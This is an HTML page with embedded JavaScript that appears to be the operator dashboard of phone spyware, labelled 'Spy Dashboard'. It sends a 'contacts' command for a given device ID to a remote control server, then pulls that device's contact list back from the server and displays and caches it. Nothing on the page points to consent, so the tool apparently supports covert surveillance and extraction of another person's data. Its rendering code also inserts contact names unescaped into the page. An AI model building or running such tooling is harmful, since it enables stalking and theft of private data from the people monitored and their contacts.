<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Spy Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 25px; padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 40px; height: 40px; background: var(--glass-bg); border-radius: 50%;
        }

        .page-title { font-size: 1.2rem; font-weight: bold; }

        .contact-list {
            display: flex; flex-direction: column; gap: 10px;
            max-height: 600px; overflow-y: auto; padding-right: 5px;
        }

        .contact-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: center;
            border: 1px solid var(--glass-border); transition: 0.2s;
        }

        .avatar {
            width: 40px; height: 40px;
            background: linear-gradient(45deg, #4caf50, #2e7d32);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-weight: bold; margin-right: 15px; flex-shrink: 0;
        }

        .info { flex: 1; overflow: hidden; }
        .name { font-size: 1rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .number { font-size: 0.85rem; color: var(--text-muted); }

        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
        
        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Contacts</span>
            <button onclick="fetchContacts()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i> Refresh</button>
        </div>

        <div class="contact-list" id="contactsContainer">
            </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');

        const storageKey = `contacts_${DEVICE_ID}`;

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("ID missing!");
                window.location.href = "index.html";
                return;
            }

            // 1. Pehle LocalStorage se purana data dikhao
            loadFromStorage();

            // 2. Command bhejo aur naya data fetch karo
            sendCommand();
            setTimeout(fetchContacts, 2000); 
        });

        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                renderContacts(JSON.parse(savedData));
            } else {
                document.getElementById("contactsContainer").innerHTML = `
                    <div class="status-msg">
                        <i class="fa-solid fa-circle-notch fa-spin"></i>
                        <p>Loading for the first time...</p>
                    </div>`;
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            });
        }

        function fetchContacts() {
            const btn = document.getElementById("refreshBtn");
            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i> Loading...';

            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`)
                .then(res => res.json())
                .then(data => {
                    if (data && data.length > 0) {
                        // 3. Naya data LocalStorage mein save karo
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        renderContacts(data);
                    }
                })
                .finally(() => {
                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> Refresh';
                });
        }

        function renderContacts(data) {
            const container = document.getElementById("contactsContainer");
            container.innerHTML = "";
            
            data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));

            data.forEach(contact => {
                const name = contact.name || "Unknown";
                const number = contact.number || contact.phone || "No Number";
                const initial = name.charAt(0).toUpperCase();
                
                container.innerHTML += `
                    <div class="contact-card">
                        <div class="avatar">${initial}</div>
                        <div class="info">
                            <div class="name">${name}</div>
                            <div class="number">${number}</div>
                        </div>
                        <div style="color:var(--accent)"><i class="fa-solid fa-phone"></i></div>
                    </div>`;
            });
        }
    </script>
</body>
</html>
